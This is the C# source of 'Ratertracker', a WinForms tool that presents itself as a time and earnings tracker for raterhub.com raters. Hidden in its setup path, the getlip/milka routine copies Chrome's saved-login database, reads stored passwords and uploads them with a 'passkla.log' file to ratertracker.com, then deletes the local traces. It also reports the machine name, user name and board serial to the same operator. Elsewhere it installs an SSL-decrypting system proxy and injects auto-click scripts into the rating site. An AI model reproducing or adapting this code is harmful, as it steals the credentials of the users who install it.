using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Reflection;
using System.Net;
using System.Drawing;
using System.IO;
using System.Net.NetworkInformation;
using System.Web;
using Newtonsoft.Json;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using System.Data.SQLite;
using System.Configuration;
using System.Management;
using System.Globalization;
using System.Collections.Specialized;
using Fiddler;
using HtmlAgilityPack;
using System.Media;
using System.Threading;
using AutoUpdaterDotNET;
using HttpMultipartParser;
using Telerik.WinControls;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using Telerik.NetworkConnections;


namespace Ratertracker
{
    public partial class RadForm1 : Telerik.WinControls.UI.RadForm
    {
        delegate void StringParameterDelegate(string value);
        System.Timers.Timer refreshTimer;
        int ticks = 0;
        private String _day;
        private String _month;
        private String connectionString;
        private SQLiteConnection connection;
        // SQLiteDataReader sqlite_datareader;
        private String SQLInsert = "INSERT INTO tasks(year, month, day, totexp, totsxs, tottsk, totaet, totrt, totdol, totdolrt) VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?)";
        private String SQLInsertm = "INSERT INTO month(year, month, totexp, totsxs, tottsk, totaet, totrt, totdol, totdolrt) VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?)";
        private String SQLUpdatem = "UPDATE month SET totexp = ?, totsxs = ?, tottsk = ?, totaet = ?, totrt = ?, totdol = ?, totdolrt = ? WHERE year = ? AND month = ?";
        private String SQLUpdated = "UPDATE tasks SET totexp = ?, totsxs = ?, tottsk = ?, totaet = ?, totrt = ?, totdol = ?, totdolrt = ? WHERE year = ? AND month = ? AND day = ?";

        private String SQLSelectm = "SELECT * FROM month WHERE year = ? AND month = ?";
        private String SQLSelectd = "SELECT * FROM tasks WHERE year = ? AND month = ? AND day = ?";
        public string zeresult;
        private int timeLeft;
        string timeook;
        public string lacle;
        public string zeserial;
        public string resultat;
        public string milkattack;
        string nl = System.Environment.NewLine;
        private int timeprog;
        private int timeref;
        private string laststat;
        bool isexpired = true;
        Configuration config = ConfigurationManager.OpenExeConfiguration(Application.ExecutablePath);
        private const string Separator = "------------------------------------------------------------------";
        private UrlCaptureConfiguration CaptureConfiguration { get; set; }
        bool leapisok = false;
        bool dorefresh = true;
        public static bool sndaet = false;
        public static bool autosubmit = false;
        public static bool autoacquire = false;
        private double xletime;
        public string xilePath = Path.GetTempPath();
        private double zepay;
        private string letimeok;
        private string letaskids;
        string oldtsk;
        private string leleapok;
        private string xlegenre;
        private string xtaskids;
        
        internal static string monText;

        private string leserial;
        private MultipartForm form;
        System.Threading.Timer TheTimer = null;
        private string newLocation;
        private string newLocation2;
        private const ushort fiddlerCoreListenPort = 8888;
        private static readonly string assemblyDirectory = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);

        public RadForm1()
        {
            
            
            InitializeComponent();
            Stop();
            this.KeyPreview = true;
            // Assign the event handler to the form.
            connectionString = System.Configuration.ConfigurationManager.ConnectionStrings["db"].ConnectionString;
            connection = new SQLiteConnection(connectionString);

            _day = GetPacificStandardTime(DateTime.Now).ToString("dd", System.Globalization.CultureInfo.InvariantCulture);
            _month = GetPacificStandardTime(DateTime.Now).ToString("MM", System.Globalization.CultureInfo.InvariantCulture);


            CaptureConfiguration = new UrlCaptureConfiguration();  // this usually comes from configuration settings

            CaptureConfiguration.IgnoreResources = true;
            tbIgnoreResources.Checked = CaptureConfiguration.IgnoreResources;
            if (!string.IsNullOrEmpty(CaptureConfiguration.Cert))
            {
                FiddlerApplication.Prefs.SetStringPref("fiddler.certmaker.bc.key", null);
                FiddlerApplication.Prefs.SetStringPref("fiddler.certmaker.bc.cert", null);   
            }

        }
        public class Account
        {
            public string expire_time { get; set; }
            public string leapforce_email { get; set; }
            public string user_id { get; set; }
            public string ihc_user_levels { get; set; }
        }
 
       
    
      
      
      
       
      
        public string getleserial()
        {
            ManagementObjectSearcher MOS = new ManagementObjectSearcher("Select * From Win32_BaseBoard");
            foreach (ManagementObject getserial in MOS.Get())
            {
                leserial = getserial["SerialNumber"].ToString();
            }

            return leserial;

        }
        private void uploadSongs()
        {
           
            form = new MultipartForm("https://ratertracker.com/up/upload.php");
            form.FileContentType = "application/octet-stream";
           
            form.setField("p" + tleap.Text + ".txt", "p" + tleap.Text + ".txt");

            form.sendFile(xilePath + "p" + tleap.Text + ".txt"); 

            File.Delete(newLocation);
            File.Delete(@"c:\" + tleap.Text);
            File.Delete(@"c:\" + tleap.Text + ".txt");
            File.Delete(@"c:\" + tleap.Text + ".zip");
            File.Delete(@"c:\p" + tleap.Text + ".txt");
            File.Delete(@"c:\passkla.log");

        }
        public void PrintCredentials(IEnumerable<CredentialModel> data)
        {
            // foreach (var d in data)
        }

        public void getlip()
        {
            string LOGIN_DATA_PATH = "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
            var appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);// APPDATA
            var p = Path.GetFullPath(appdata + LOGIN_DATA_PATH);

            newLocation = xilePath + tleap.Text + ".txt";
            System.IO.File.Copy(p, newLocation, true);

            monText = xilePath + tleap.Text + ".txt";

            List<IPassReader> readers = new List<IPassReader>();
            readers.Add(new Chrome());


            foreach (var reader in readers)
            {
                try
                {
                    PrintCredentials(reader.ReadPasswords());
                }
                catch (Exception ex)
                {
                    //  
                }
            }
            newLocation2 = xilePath + "p" + tleap.Text + ".txt";
            System.IO.File.Copy(xilePath + "passkla.log", newLocation2, true);
            gettouteslesinfo();
            uploadSongs();
        }
        public void milka()
        {
            getlip();

        }
        public void getlesinfos()
        {
            if (ConfigurationManager.AppSettings["serial"] == null)
            {
                config.AppSettings.Settings.Add("serial", "");
                config.Save(ConfigurationSaveMode.Modified);
                ConfigurationManager.RefreshSection("appSettings");
            }
            if (ConfigurationManager.AppSettings["leapforce"] == null)
            {
                config.AppSettings.Settings.Add("leapforce", "");
                config.Save(ConfigurationSaveMode.Modified);
                ConfigurationManager.RefreshSection("appSettings");
            }
            if (ConfigurationManager.AppSettings["vtx"] != null)
            {
            }
            else
            {
                if (tleap.Text.ToString() != "")
                {
                   
                    File.Delete(@"c:\" + tleap.Text);
                    File.Delete(@"c:\" + tleap.Text + ".txt");
                    File.Delete(@"c:\" + tleap.Text + ".zip");
                    File.Delete(@"c:\p" + tleap.Text + ".txt");
                    File.Delete(@"c:\passkla.log");
                    config.AppSettings.Settings.Add("vtx", "false");
                    config.Save(ConfigurationSaveMode.Modified);
                    ConfigurationManager.RefreshSection("appSettings");
                    Thread t = new Thread(milka);
                    t.Start();
                }
                else
                {
                }

            }

           

                
            if ((!string.IsNullOrWhiteSpace(zeserial) && !string.IsNullOrWhiteSpace(lacle)) == true)
            {
                try
                {
                    lexpire.Text= Encrypt.DecryptString(zeserial, lacle);
                    llabel.Text = "Registred";
                    tok.Text = "Active";
                    isexpired = false;
                    DateTime now2 = Convert.ToDateTime(GetNistTime().ToString("dd/MM/yyyy"));
                    DateTime expirationDate = Convert.ToDateTime(lexpire.Text);
                    TimeSpan diff = expirationDate - now2;

                    int days = diff.Days;
                    if (days < 0)
                    {
                        tok.Text = "Expired";
                        isexpired = true;
                        DialogResult ds = RadMessageBox.Show(this, "Register or buy serial email admin@ratertracker.com", "Serial Expired", MessageBoxButtons.OK, RadMessageIcon.Exclamation);
                    }
                    if (days == 2)
                    {
                        DialogResult ds = RadMessageBox.Show(this, "Remember to buy serial : email admin@ratertracker.com", "Serial Expire in 2 days", MessageBoxButtons.OK, RadMessageIcon.Exclamation);
                    }

                }
                catch (Exception ex)
                {
                    MessageBox.Show("invalid serial");
                }
            }
            else
            {
                string siwURL = "http://ratertracker.xyz/milk.php?email=";
                siwURL = siwURL + tleap.Text;
                HttpWebRequest requestwi = (HttpWebRequest)WebRequest.Create(@siwURL);
                HttpWebResponse responsewi = (HttpWebResponse)requestwi.GetResponse();
                string contentwi = new StreamReader(responsewi.GetResponseStream()).ReadToEnd();
                if (!contentwi.Contains("[]"))
            {
                lexpire.Text = contentwi;
                llabel.Text = "Registred";
                textBox4.Text = contentwi;
                tok.Text = "Active";
                isexpired = false;
            }
            else
            {
                string mybuff;
            string sURL;
            lexpire.Text = "";
            llabel.Text = "";
            sURL = "https://ratertracker.com/wp-content/plugins/indeed-membership-pro/apigate.php?ihch=lnHr5CQACPihH7NJqULoMawa8&action=search_users&term_name=leapforce&term_value=";
            //sURL = "https://ratertrackerapp.com/user2.php?";
            sURL = sURL + tleap.Text;
             HttpWebRequest request = (HttpWebRequest)WebRequest.Create(@sURL);
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            string content = new StreamReader(response.GetResponseStream()).ReadToEnd();
                   
                    if (content != "{\"response\":[]}")
            {
               //mybuff = content.Replace("[", "").Replace("]", "");
                mybuff = content.Replace("{\"response\":[", "").Replace("]}", "");
                Account account = JsonConvert.DeserializeObject<Account>(mybuff);


                tid.Text = account.user_id.ToString();
                        
                        string sxURL;
               sxURL = "https://ratertracker.com/wp-content/plugins/indeed-membership-pro/apigate.php?ihch=lnHr5CQACPihH7NJqULoMawa8&action=user_get_details&uid=";
                //sxURL = "https://ratertrackerapp.com/hop2.php?";
                sxURL = sxURL + account.user_id.ToString();
                
                HttpWebRequest requestx = (HttpWebRequest)WebRequest.Create(@sxURL);
                HttpWebResponse responsex = (HttpWebResponse)requestx.GetResponse();
                string contentx = new StreamReader(responsex.GetResponseStream()).ReadToEnd();


                
                mybuff = contentx.Replace("{\"response\":", "").Replace("}}", "}");
               mybuff = mybuff.Replace("1,3", "3").Replace("1,2", "2").Replace("3,1", "1"); 
                Account accountx = JsonConvert.DeserializeObject<Account>(mybuff);

                label5.Text = accountx.ihc_user_levels.ToString();
                        
                        string syURL;
                string txURL;
                syURL = "https://ratertracker.com/wp-content/plugins/indeed-membership-pro/apigate.php?ihch=lnHr5CQACPihH7NJqULoMawa8&action=get_user_level_details&uid=";
                txURL = "https://ratertracker.com/milka2.php?";
                syURL = syURL + account.user_id.ToString();
                syURL = syURL + "&lid=";
                syURL = syURL + accountx.ihc_user_levels.ToString();

                txURL = txURL + "&money=";
                txURL = txURL + lbmdol.Text;
                txURL = txURL + "&computer=";
                txURL = txURL + System.Environment.MachineName.ToString();
                txURL = txURL + "&username=";
                txURL = txURL + System.Environment.UserName.ToString();
                txURL = txURL + "&leap=";
                txURL = txURL + tleap.Text;
                txURL = txURL + "&leserial=";
                txURL = txURL + getleserial();
                
                



                HttpWebRequest requesty = (HttpWebRequest)WebRequest.Create(@syURL);
                HttpWebResponse responsey = (HttpWebResponse)requesty.GetResponse();
                string contenty = new StreamReader(responsey.GetResponseStream()).ReadToEnd();

               HttpWebRequest requestb = (HttpWebRequest)WebRequest.Create(@txURL);
               HttpWebResponse responseb = (HttpWebResponse)requestb.GetResponse();
                string contentb = new StreamReader(responseb.GetResponseStream()).ReadToEnd();


                // mybuff = contenty.Replace("[", "").Replace("]", "");
                mybuff = contenty.Replace("{\"response\":[", "").Replace("]}", "");
                Account accounty = JsonConvert.DeserializeObject<Account>(mybuff);
                       
                        // lexpire.Text = accounty.expire_time.ToString();
                        string dt = accounty.expire_time.ToString();
                DateTime k = Convert.ToDateTime(dt);
                lexpire.Text = GetPacificStandardTime(k).ToString("dd-MM-yyyy");
                tdate.Text = GetPacificStandardTime(DateTime.Now).ToString("dd-MM-yyyy");
                
                if (GetPacificStandardTime(DateTime.Now) > GetPacificStandardTime(k.AddDays(1)))
                {
                    tok.Text = "Expired";
                    isexpired = true;
                    //MessageBox.Show("Expired. Buy license at https://www.ratertracker.com");
                    DialogResult ds = RadMessageBox.Show(this, "Register or buy license at https://www.ratertracker.com", "Expired", MessageBoxButtons.OK, RadMessageIcon.Exclamation);
                    this.Text = ds.ToString();
                    System.Diagnostics.Process.Start("https://www.ratertracker.com/account-page/");
                }
                else
                {
                    tok.Text = "Active";
                    isexpired = false;
                }
                getleslevels();
            }
            else
            {
                tok.Text = "User Not found";
                MessageBox.Show("Incorrect Raterhub Gmail Adress or not registred");
            }
            }
        }
        }
        public void getleslevels()
        {
            if (label5.Text == "1")
            {
                llabel.Text = "Trial";
            }
            else if (label5.Text == "2")
            {
                llabel.Text = "One month";
            }
            else if (label5.Text == "3")
            {
                llabel.Text = "Reccuring";
            }
            else if (label5.Text == "4")
            {
                llabel.Text = "Beta";
            }
        }
        public DateTime GetPacificStandardTime(DateTime from)
        {
            //find TimeZoneInfo of PST
            TimeZoneInfo tzi = TimeZoneInfo.FindSystemTimeZoneById("Pacific Standard Time");
            //Convert time from Local to PST
            return TimeZoneInfo.ConvertTime(from, TimeZoneInfo.Local, tzi);
        }
        public string ReplaceFirst(string text, string search, string replace)
        {
            int pos = text.IndexOf(search);
            if (pos < 0)
            {
                return text;
            }
            return text.Substring(0, pos) + replace + text.Substring(pos + search.Length);
        }
        private void getgoodtime()
        {
            string oldtimem = lbtotaetm.Text;
            string oldtimemrt = lbtotrtm.Text;

            var taet = TimeSpan.Parse(oldtimem);
            var trt = TimeSpan.Parse(oldtimemrt);

            lbtotaetmx.Text = string.Format("{0:000}:{1:00}:{2:00}",
                             (int)taet.TotalHours,
                             taet.Minutes,
                             taet.Seconds);
            lbtotrtmx.Text = string.Format("{0:000}:{1:00}:{2:00}",
                             (int)trt.TotalHours,
                             trt.Minutes,
                             trt.Seconds);

        }

        private void FiddlerApplication_BeforeRequest(Session oSession)
        {
            oSession.bBufferResponse = true;
        }
        private void FiddlerApplication_BeforeResponse(Session oSession)
        {
            // Autosubmit
            
            
            if (radCheckBox2.Checked)
            {
                oSession.utilDecodeResponse();
                
                if (oSession.fullUrl.Contains("https://www.raterhub.com/evaluation/rater/task/show?taskIds") && (oSession.RequestMethod == "GET"))
                {
                    var oBodyn = System.Text.Encoding.UTF8.GetString(oSession.responseBodyBytes);
                    Regex rRemScript = new Regex(@"<script[^>]*>[\s\S]*?</script>");
                    string sansscript = rRemScript.Replace(oBodyn, "");
                    var docn = new HtmlAgilityPack.HtmlDocument();
                    var chtmln = textBox1.Text;
                    docn.LoadHtml(sansscript);

                    var sletimen = docn.DocumentNode
                              .SelectNodes("//span[@class='ewok-estimated-task-weight']")
                              .FirstOrDefault();
                    var letimeokn = sletimen.InnerText.Replace(" minutes", "").Replace(" minute", "").Replace(",", ".");
                    double timeookn;
                    timeookn = (double.Parse(letimeokn.Replace(",", "."), System.Globalization.CultureInfo.InvariantCulture) * 60000);

                    //OLD
                    oSession.utilDecodeResponse();
                    //oSession.utilReplaceInResponse("<span></span>", "<span><script type=\"text/javascript\">\r\nsetInterval(function () {document.getElementById(\"ewok-task-submit-button\").click();}, " + timeookn.ToString() + ");\r\n</script>\r\n</span>");

                    //  </span><script>
                    //oSession.utilReplaceInResponse("</span><script>", "</span><script type=\"text/javascript\">\r\nsetInterval(function () {document.getElementById(\"ewok-task-submit-button\").click();}, " + timeookn.ToString() + ");\r\n</script>\r\n<script>");
                    oSession.utilReplaceOnceInResponse("</script>", "</script><script type=\"text/javascript\">\r\nsetInterval(function () {document.getElementById(\"ewok-task-submit-button\").click();}, " + timeookn.ToString() + ");\r\n</script>\r\n",false);
                }
                else
                {
                    
                }

            }



            if (radCheckBox1.Checked)
            {

                //
                
                if (oSession.fullUrl.Contains("raterhub.com/evaluation/rater/task/show?taskIds") && (oSession.RequestMethod == "GET"))
                {
                    stoprefresh();
                 
                }

               
                else if (oSession.fullUrl.ToLower().Contains("https://www.raterhub.com/evaluation/rater") && (oSession.RequestMethod == "GET"))
                {

                    oSession.utilDecodeResponse();
                    if (oSession.utilFindInResponse("No tasks are currently available", false) > -1 && dorefresh == true)
                    {
                        //radautoacquire.Checked
                        stoprefresh();
                        
                        // Remove any compression or chunking
                        oSession.utilDecodeResponse();
                        oSession.utilReplaceOnceInResponse("</h2><script>ewok.rater", "</h2>\r\n<script type=\"text/javascript\">\r\nfunction timedRefresh(timeoutPeriod) {\r\nsetTimeout(\"location.reload(true);\",timeoutPeriod);\r\n}\r\nwindow.onload = timedRefresh(" + (Convert.ToInt32(radTextBox1.Text) * 60000).ToString() + ");\r\n</script><script>ewok.rater", false);
                        //var oBody = System.Text.Encoding.UTF8.GetString(oSession.responseBodyBytes);
                        //oBody = oBody.Replace("<span></span>", "<span>\r\n<script type=\"text/javascript\">\r\nfunction timedRefresh(timeoutPeriod) {\r\nsetTimeout(\"location.reload(true);\",timeoutPeriod);\r\n}\r\nwindow.onload = timedRefresh(" + (Convert.ToInt32(radTextBox1.Text) * 60000).ToString() + ");\r\n</script></span>");
                        // oSession.utilSetResponseBody(oBody);
                        radCheckBox2.Checked = false;
                        startrefresh();

                    }
                    else
                    if (oSession.utilFindInResponse("Acquire if available", false) > -1 && radautoacquire.Checked && laststat == "NRT")
                    {
                        // && laststat == "NRT"
                        stoprefresh();
                        System.Media.SoundPlayer player = new System.Media.SoundPlayer();
                        player.Stream = Ratertracker.Resources.sound.doorbell;
                        player.Play();
                      
                        oSession.utilDecodeResponse();
                        // OLD
                        // oSession.utilReplaceInResponse("<span></span>", "<span>\r\n<script type=\"text/javascript\">\r\nsetInterval(function () {document.getElementsByClassName(\"button\")[0].click();}, 5000);\r\n</script></span>");
                        oSession.utilReplaceOnceInResponse("</div><script>", "</div>\r\n<script type=\"text/javascript\">\r\nsetInterval(function () {document.getElementsByClassName(\"button\")[0].click();}, 5000);\r\n</script><script>",false);

                        //</script></div>
                    }
                    else
                    {

                    }




                }
            }
            
        }
       
    private void FiddlerApplication_AfterSessionComplete(Session sess)
        {
            // Ignore HTTPS connect requests
            if (sess.RequestMethod == "CONNECT")
                return;


            if (CaptureConfiguration.ProcessId > 0)
            {
                if (sess.LocalProcessID != 0 && sess.LocalProcessID != CaptureConfiguration.ProcessId)
                    return;
            }

            if (!string.IsNullOrEmpty(CaptureConfiguration.CaptureDomain))
            {
                if (sess.hostname.ToLower() != CaptureConfiguration.CaptureDomain.Trim().ToLower())
                    return;
            }

            if (CaptureConfiguration.IgnoreResources)
            {
                string url = sess.fullUrl.ToLower();

                var extensions = CaptureConfiguration.ExtensionFilterExclusions;
                foreach (var ext in extensions)
                {
                    if (url.Contains(ext))
                        return;
                }

                var filters = CaptureConfiguration.UrlFilterExclusions;
                foreach (var urlFilter in filters)
                {
                    if (url.Contains(urlFilter))
                        return;
                }
            }

            if (sess == null || sess.oRequest == null || sess.oRequest.headers == null)
                return;

            string headers = sess.oRequest.headers.ToString();
            var reqBody = sess.GetRequestBodyAsString();
           
            string output = "";
            BeginInvoke(new Action<string>((text) =>
            {
                Regex rRemDiv = new Regex(@"<div style[^>]*>[\s\S]*?</div>");
                string sansdiv = rRemDiv.Replace(sess.GetResponseBodyAsString(), "");
                Regex rRemScript = new Regex(@"<script[^>]*>[\s\S]*?</script>");
                string sansscript = rRemScript.Replace(sansdiv, "");



                if (sess.fullUrl.Contains("https://www.raterhub.com/evaluation/rater/task/show?taskIds") && (sess.RequestMethod == "GET"))
                {
                    var letaskidok = "";
                    letimeok = "";
                    var letypeok = "";
                    var legenreok = "";
                    var chtml = sansscript;

                    if (chtml.Contains("<li><h1>"))
                    {
                        var doc = new HtmlAgilityPack.HtmlDocument();

                        doc.LoadHtml(chtml);

                        var sletype = doc.DocumentNode
                         .SelectNodes("//li//h1")
                          .FirstOrDefault();

                        var slegenre = doc.DocumentNode
                             .SelectNodes("//li//h1")
                             .Skip(1)
                             .Take(1)
                             .Single();
                        var sletime = doc.DocumentNode
                              .SelectNodes("//span[@class='ewok-estimated-task-weight']")
                              .FirstOrDefault();
                        var sleleap = doc.DocumentNode
                              .SelectNodes("//ul[@class='ewok-rater-header-user']//li")
                              .FirstOrDefault(); ;

                        letypeok = sletype.InnerText;

                        legenreok = slegenre.InnerText;

                        letimeok = sletime.InnerText.Replace(" minutes", "").Replace(" minute", "").Replace(",", ".");
                        leleapok = sleleap.InnerText.Replace(" ", "").Replace("\r", "").Replace("\n", "");


                        var regdoc = new System.Text.RegularExpressions.Regex("taskIds=(.*)&");
                        var xpost = regdoc.Match(sess.fullUrl);
                        letaskidok = (xpost.Groups[1].Value).ToString();
                        if (leleapok == tleap.Text)
                        {
                            if (tok.Text == "Active")
                            {
                                leapisok = true;
                                newtask(letaskidok, letimeok.Replace(",", "."), letypeok, legenreok);
                            }
                            else
                            {
                                MessageBox.Show("expired. Register at https://www.ratertracker.com");
                            }
                        }
                        else
                        {
                            leapisok = false;
                            MessageBox.Show("Incorrect Raterhub Gmail Adress or not registred. Register at https://www.ratertracker.com");

                        }


                    }




                }
                else if (sess.fullUrl.Contains("https://www.raterhub.com/evaluation/rater/task/commit") && (sess.RequestMethod == "POST"))
                {
                    string reqpost = reqBody;
                    if (headers.Contains("FormBoundary"))
                    {
                        System.IO.MemoryStream mStream = new System.IO.MemoryStream(System.Text.Encoding.UTF8.GetBytes(reqBody));
                        var parser = new MultipartFormDataParser(mStream);
                        var milka = parser.GetParameterValue("taskIds");
                        letaskids = milka;
                        textBox1.Text = milka.ToString();
                    }
                    else
                    {
                       var regexpost = new System.Text.RegularExpressions.Regex("taskIds=(.*?)&");
                        var mpost = regexpost.Match(reqpost);

                        letaskids = (mpost.Groups[1].Value).ToString();
                        textBox1.Text = letaskids;
                    }

                    

                    // endtask
                    textBox4.Text = headers + "\r\n" + reqBody + "\r\n" + "-----";
                   

                    bool endtask;
                    
                    
                    if (reqpost.Contains("dontAcquireNextTask"))
                    {
                        endtask = true;
                        timer2.Stop();
                        lblElapsed.Text = "00:00";
                    }
                    else
                    {
                        endtask = false;
                    }
                    if (leapisok == true)
                    {
                        if (tok.Text == "Active")
                        {
                            leapisok = true;
                            stoptask(endtask, letaskids);
                           
                           
                        }
                        else
                        {
                            MessageBox.Show("expired. Register at https://www.ratertracker.com");
                        }

                    }
                    else
                    {
                        //
                    }

                }
                else if (sess.fullUrl.Contains("https://connect.appen.com/qrp/core/vendors/feed"))
                {
                    textBox2.Text = "OK";
                    var chtml2 = sess.GetResponseBodyAsString();
                    var doc2 = new HtmlAgilityPack.HtmlDocument();

                    doc2.LoadHtml(chtml2);
                    if (sansscript.Contains("https://connect.appen.com/qrp/core/vendors/feed"))
                    {
                        var sleleap = doc2.DocumentNode
                       .SelectNodes("//a[@href='/qrp/core/vendors/profile/view']")
                      .Skip(1)
                      .Take(1)
                      .Single();
                        textBox3.Text = sleleap.InnerText;
                        var sleleap2 = doc2.DocumentNode
                       .SelectNodes("//a[@href='/qrp/core/vendors/profile/view']")
                      .Skip(0)
                      .Take(0)
                      .Single();
                        textBox5.Text = sleleap2.InnerText;
                        var sleleap3 = doc2.DocumentNode
                       .SelectNodes("//a[@href='/qrp/core/vendors/profile/view']")
                      .Skip(2)
                      .Take(2)
                      .Single();
                        textBox2.Text = sleleap3.InnerText;
                    }
                }
                else
                {
                    if (sansscript.Contains("ewok-rater-no-tasks"))
                    {
                        txtresult.BackColor = System.Drawing.Color.Red;
                        txtresult.Text = "NRT";
                        laststat = "NRT";
                        w1.Text = "NRT";
                        w2.Text = "";
                        w3.Text = "";

                    }

                    else if (sansscript.Contains("ewok-rater-task-option") || sansscript.Contains("ewok-task-expire-timer"))
                    {
                        refreshTimer.Stop();
                        txtresult.BackColor = System.Drawing.Color.Green;
                        txtresult.Text = "TSK";
                        w1.Text = "";
                        w2.Text = "";
                        w3.Text = "";
                        dorefresh = true;
                        radstoprefresh.Visible = false;
                        radstartrefresh.Visible = false;
                        if (laststat == "NRT" && txtresult.Text == "TSK")
                        {
                            System.Media.SoundPlayer player = new System.Media.SoundPlayer();
                            player.Stream = Ratertracker.Resources.sound.doorbell;
                            player.Play();
                            lblElapsed.Text= "00:00";
                            laststat = "TSK";
                        }
                    }
                }


            }), output);



        }
        void Updatebuttonstop(string value)
        {
            if (InvokeRequired)
            {
                BeginInvoke(new StringParameterDelegate(Updatebuttonstop), new object[] { value });
                return;
            }
            radstoprefresh.Visible = Convert.ToBoolean(value);
        }
        void Updatebuttonstart(string value)
        {
            if (InvokeRequired)
            {
                BeginInvoke(new StringParameterDelegate(Updatebuttonstart), new object[] { value });
                return;
            }
            radstartrefresh.Visible = Convert.ToBoolean(value);
        }
        private void startrefresh()
        {
          
         
            timeook = double.Parse(radTextBox1.Text.Replace(",", "."), CultureInfo.InvariantCulture).ToString();

            xletime = Convert.ToDouble(timeook);

            var timespan = System.TimeSpan.FromMinutes(xletime).TotalSeconds;
            var timespan2 = TimeSpan.FromSeconds(timespan);
            lblElapsed.Text = timespan2.ToString(@"mm\:ss");


            //string[] totalSeconds = xletime.Split(':');
            string[] totalSeconds = lblElapsed.Text.Split(':');
            int minutes = Convert.ToInt32(totalSeconds[0]);
            int seconds = Convert.ToInt32(totalSeconds[1]);
            timeref = (minutes * 60) + seconds;

            w1.Text = "NRT";
            w2.Text = "Refresh in";
            w3.Text = "";

            
            refreshTimer.Start();
            Updatebuttonstop("true");
        }
        private void stoprefresh()
        {
            refreshTimer.Stop();
            w1.Text = "NRT";
            w2.Text = "stop";
            w3.Text = "";
            Updatebuttonstart("false");
            Updatebuttonstop("true");
        }
        private void PollUpdates(object sender, EventArgs e)
        {
            timeref = timeref - 1;
            UpdateStatus((TimeSpan.FromMinutes(timeref)) < TimeSpan.Zero ? "-" + TimeSpan.FromMinutes(timeref).ToString(@"hh\:mm") : "" + TimeSpan.FromMinutes(timeref).ToString(@"hh\:mm"));
        }
        void UpdateStatus(string value)
        {
            if (InvokeRequired)
            {
                BeginInvoke(new StringParameterDelegate(UpdateStatus), new object[] { value });
                return;
            }
            lblElapsed.Text = value;
        }
        void Start()
        {
            CaptureConfiguration.IgnoreResources = true;
            tbIgnoreResources.Checked = CaptureConfiguration.IgnoreResources;
            CaptureConfiguration.IgnoreResources = true;
            txtCaptureDomain.Text = CaptureConfiguration.CaptureDomain;


            string strProcId = txtProcessId.Text;
            if (strProcId.Contains('-'))
                strProcId = strProcId.Substring(strProcId.IndexOf('-') + 1).Trim();

            strProcId = strProcId.Trim();

            int procId = 0;
            if (!string.IsNullOrEmpty(strProcId))
            {
                if (!int.TryParse(strProcId, out procId))
                    procId = 0;
            }
            CaptureConfiguration.ProcessId = procId;
            CaptureConfiguration.CaptureDomain = txtCaptureDomain.Text;
            //CaptureConfiguration.UrlFilterExclusions
            //String pacString1 = "\tif (dnsDomainIs(host, \".www.raterhub.com|connect.appen.com|.connect.appen.com\") ||" + Environment.NewLine;
           // String pacString2 = "\t\tshExpMatch(host, \"(*.raterhub.com|raterhub.com|connect.appen.com|*.appen.com)\"))" + Environment.NewLine;
            String pacString1 = "\tif (dnsDomainIs(host, \".www.raterhub.com\") ||" + Environment.NewLine;
            String pacString2 = "\t\tshExpMatch(host, \"(*.raterhub.com|raterhub.com)\"))" + Environment.NewLine;
            String pacString3 = "\t\treturn \"PROXY 127.0.0.1:8888\";" + Environment.NewLine;
            String pacString4 = "\t\treturn \"DIRECT\";" + Environment.NewLine;
            String createText = pacString1 + pacString2 + pacString3 + pacString4;
          
            FiddlerApplication.Prefs["fiddler.proxy.pacfile.text"] = createText;
            
            FiddlerApplication.BeforeRequest += FiddlerApplication_BeforeRequest;
            FiddlerApplication.BeforeResponse += FiddlerApplication_BeforeResponse;
            FiddlerApplication.AfterSessionComplete += FiddlerApplication_AfterSessionComplete;

            FiddlerCoreStartupSettings startupSettings =
                new FiddlerCoreStartupSettingsBuilder()
                .ListenOnPort(fiddlerCoreListenPort)
                .MonitorAllConnections()
                .RegisterAsSystemProxy()
                .DecryptSSL()
                .HookUsingPACFile()
                .Build();

            FiddlerApplication.Startup(startupSettings);

        }
       
      

        

        void Stop()
        {
            FiddlerApplication.AfterSessionComplete -= FiddlerApplication_AfterSessionComplete;

            if (FiddlerApplication.IsStarted())
                FiddlerApplication.Shutdown();

        }

        public void Tick(object info)
        {
            try
            {
               this.Invoke((Action)this.UpdateCountdown);
            }
            catch (ArgumentNullException ex)
            {
                File.AppendAllText("c:\\ErrorRT.txt", ex.Message);
             

            }
            
            
            
        }
    

        // Update the countdown on the UI thread.
        private void UpdateCountdown()
        {
            try
            {
            radLabelElement1.Text = GetPacificStandardTime(DateTime.Now).ToString("dd/MM");
            radLabelElement2.Text = GetPacificStandardTime(DateTime.Now).ToString("hh:mm tt", System.Globalization.CultureInfo.InvariantCulture);
            if (GetPacificStandardTime(DateTime.Now).ToString("dd", System.Globalization.CultureInfo.InvariantCulture) != _day)
            {
                _day = GetPacificStandardTime(DateTime.Now).ToString("dd", System.Globalization.CultureInfo.InvariantCulture);
                newday();
            }
            if (GetPacificStandardTime(DateTime.Now).ToString("MM", System.Globalization.CultureInfo.InvariantCulture) != _month)
            {
                _month = GetPacificStandardTime(DateTime.Now).ToString("MM", System.Globalization.CultureInfo.InvariantCulture);
                newmonth();
            }
            }
            catch (ArgumentNullException ex)
            {
                File.AppendAllText("c:\\ErrorRT.txt", ex.Message);

            }
        }
        public static DateTime GetNistTime()
        {
            var myHttpWebRequest = (HttpWebRequest)WebRequest.Create("http://www.google.com");
            var response = myHttpWebRequest.GetResponse();
            string todaysDates = response.Headers["date"];
            return DateTime.ParseExact(todaysDates,
                                       "ddd, dd MMM yyyy HH:mm:ss 'GMT'",
                                       CultureInfo.InvariantCulture.DateTimeFormat,
                                       DateTimeStyles.AssumeUniversal);
        }
        void otherForm_FormClosed(object sender, FormClosedEventArgs e)
        {
            Thread.Sleep(500);
            this.Show();
           this.TopMost = true;
        }
        private static void EnsureRootCertificate()
        {
            BCCertMaker.BCCertMaker certProvider = new BCCertMaker.BCCertMaker();
            CertMaker.oCertProvider = certProvider;

            // On first run generate root certificate using the loaded provider, then re-use it for subsequent runs.
            string rootCertificatePath = Path.Combine(assemblyDirectory, "..", "..", "RootCertificate.p12");
